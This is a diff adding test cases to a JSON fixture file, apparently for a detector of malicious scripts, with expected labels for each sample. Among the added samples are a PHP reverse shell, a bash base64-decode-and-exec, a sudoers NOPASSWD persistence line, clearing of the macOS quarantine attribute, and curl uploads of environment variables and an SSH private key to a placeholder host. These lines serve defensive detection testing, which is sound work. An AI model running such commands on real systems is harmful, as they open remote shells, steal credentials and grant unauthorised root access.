@@ -301,5 +301,114 @@
     "name": "python_exec_renamed_benign.py",
     "text": "import os, base64; exec(base64.b64decode('cHJpbnQoJ2luZXJ0Jyk='))\n",
     "expected": null
+  },
+  {
+    "name": "variant_revshell_fd.txt",
+    "text": "php -r '$s=fsockopen(\"192.0.2.10\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'\n",
+    "expected": "script_reverse_shell"
+  },
+  {
+    "name": "variant_revshell_fd_utf16le.bin",
+    "text": "php -r '$s=fsockopen(\"192.0.2.10\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'\n",
+    "expected": "script_reverse_shell",
+    "encoding": "utf-16le"
+  },
+  {
+    "name": "variant_revshell_fd.zip",
+    "text": "php -r '$s=fsockopen(\"192.0.2.10\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'\n",
+    "expected": "script_reverse_shell",
+    "container": "zip"
+  },
+  {
+    "name": "variant_script_captured_fds.sh",
+    "text": "sh ./run.sh <&3 >&3 2>&3\n",
+    "expected": null
+  },
+  {
+    "name": "variant_script_captured_fds_utf16le.bin",
+    "text": "sh ./run.sh <&3 >&3 2>&3\n",
+    "expected": null,
+    "encoding": "utf-16le"
+  },
+  {
+    "name": "variant_base64_subst.sh",
+    "text": "bash -c \"$(echo aW5lcnQ= | base64 -d)\"\n",
+    "expected": "script_base64_decode_pipe"
+  },
+  {
+    "name": "variant_base64_subst_utf16le.bin",
+    "text": "bash -c \"$(echo aW5lcnQ= | base64 -d)\"\n",
+    "expected": "script_base64_decode_pipe",
+    "encoding": "utf-16le"
+  },
+  {
+    "name": "variant_base64_assignment.sh",
+    "text": "KEY=\"$(echo aW5lcnQ= | base64 -d)\"\n",
+    "expected": null
+  },
+  {
+    "name": "variant_xattr_path.sh",
+    "text": "/usr/bin/xattr -d -r com.apple.quarantine /Applications/Inert.app\n",
+    "expected": "script_clear_quarantine"
+  },
+  {
+    "name": "variant_xattr_path_utf16le.bin",
+    "text": "/usr/bin/xattr -d -r com.apple.quarantine /Applications/Inert.app\n",
+    "expected": "script_clear_quarantine",
+    "encoding": "utf-16le"
+  },
+  {
+    "name": "variant_sudoers_tee.sh",
+    "text": "echo \"$USER ALL=(ALL) NOPASSWD: ALL\" | sudo tee -a /etc/sudoers\n",
+    "expected": "unix_privilege_persistence"
+  },
+  {
+    "name": "variant_sudoers_tee_utf16le.bin",
+    "text": "echo \"$USER ALL=(ALL) NOPASSWD: ALL\" | sudo tee -a /etc/sudoers\n",
+    "expected": "unix_privilege_persistence",
+    "encoding": "utf-16le"
+  },
+  {
+    "name": "variant_env_upload.sh",
+    "text": "env | curl -s -X POST -d @- https://example.invalid/c\n",
+    "expected": "script_credential_upload"
+  },
+  {
+    "name": "variant_env_upload_utf16le.bin",
+    "text": "env | curl -s -X POST -d @- https://example.invalid/c\n",
+    "expected": "script_credential_upload",
+    "encoding": "utf-16le"
+  },
+  {
+    "name": "variant_env_grep.sh",
+    "text": "env | grep PATH\n",
+    "expected": null
+  },
+  {
+    "name": "variant_key_substitution.sh",
+    "text": "curl -d \"$(cat ~/.ssh/id_rsa)\" https://example.invalid/c\n",
+    "expected": "script_credential_upload"
+  },
+  {
+    "name": "variant_key_substitution_utf16le.bin",
+    "text": "curl -d \"$(cat ~/.ssh/id_rsa)\" https://example.invalid/c\n",
+    "expected": "script_credential_upload",
+    "encoding": "utf-16le"
+  },
+  {
+    "name": "variant_token_header.sh",
+    "text": "curl -H \"Authorization: Bearer $(cat token.txt)\" https://example.invalid/v1\n",
+    "expected": null
+  },
+  {
+    "name": "variant_osascript_heredoc.sh",
+    "text": "osascript <<EOF\ndo shell script \"echo inert\"\nEOF\n",
+    "expected": "script_osascript_shell"
+  },
+  {
+    "name": "variant_osascript_heredoc_utf16le.bin",
+    "text": "osascript <<EOF\ndo shell script \"echo inert\"\nEOF\n",
+    "expected": "script_osascript_shell",
+    "encoding": "utf-16le"
   }
 ]
